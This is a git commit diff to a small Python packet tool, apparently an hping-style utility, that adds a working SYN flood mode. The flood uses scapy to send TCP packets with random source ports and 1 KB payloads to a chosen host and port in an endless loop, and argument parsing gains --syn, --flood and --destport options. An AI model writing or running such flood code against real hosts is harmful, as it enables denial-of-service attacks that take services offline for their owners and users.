89ed01120a98c0d8e929a1f33d2c6aba947553f0
navin604 <55507003+navin604@users.noreply.github.com>
2023-03-03 17:55:52 -0800

    Added syn flood

--- main.py
+++ main.py
@@ -1,31 +1,46 @@
 import getopt
-from scapy.layers.inet import TCP
+from scapy.layers.inet import TCP, IP, Ether
+from scapy.all import Raw, send
+from scapy.volatile import RandShort
 import sys
 
 
 # --Globals--
 flood = False
-flags = {"S": False}
-ports = ""
+scan = False
+flags = "R"
+ports = "0"
 target = ""
 
 
-
-
-#if no port send to 0
-#if not flood then print each received packet
-# if flood then just spam send
-
-#Starting send port is 2112
-
-
-
 def main():
+    if scan:
+        # Todo
+        print(scan)
+    if flood:
+        send_flood()
+    # Todo
+    # send_packet
+
+
+def send_flood():
+    print("In flood mode, no replies will be shown")
+    print(flags)
+    # Send packet in loop until ctrl+c is pressed
+    send(IP(dst=target, ttl=64)
+         /TCP(sport=RandShort(), flags=flags, dport=int(ports))/Raw(b"X"*1024), loop=1, verbose=0)
+    # Exit
+    sys.exit("Exiting!")
+
+
+def send_packet():
     pass
 
-
-
 def usage():
+    txt = """\nWelcome! Usage can be seen below. If you
+wish stop a request, press ctrl + c"""
+    print(txt)
+    print("-------------------------------------------\n")
     print("usage: python main.py host [options]")
     print("-h  --help   show this help")
     print("    --flood  sent packets as fast as possible. Don't show replies.")
@@ -34,7 +49,7 @@ def usage():
 
 
 def process_args():
-    global flood, target
+    global flood, target, scan, ports, flags
     try:
         opts, args = getopt.getopt(sys.argv[1:], "h8:Sp:", ["help", "flood", "syn", "destport=", "scan"])
     except getopt.GetoptError as err:
@@ -44,21 +59,19 @@ def process_args():
     for option, argument in opts:
         if option in ("-h", "--help"):
             usage()
-        elif option == "flood":
+        elif option == "--flood":
             flood = True
-            print(flood)
         elif option in ("-S", "--syn"):
-            flags['S'] = True
-            print(flags)
+            flags = "S"
         elif option in ("-p", "--destport"):
-            ports= argument
-            print(ports)
+            ports = argument
         elif option in ("-8", "--scan"):
-            ports= argument
-            print(ports)
+            scan = True
+
         else:
             assert False, "unhandled option"
     if len(args) != 1:
+        print(args)
         print("Must specify a single host!")
         sys.exit(1)
     else:
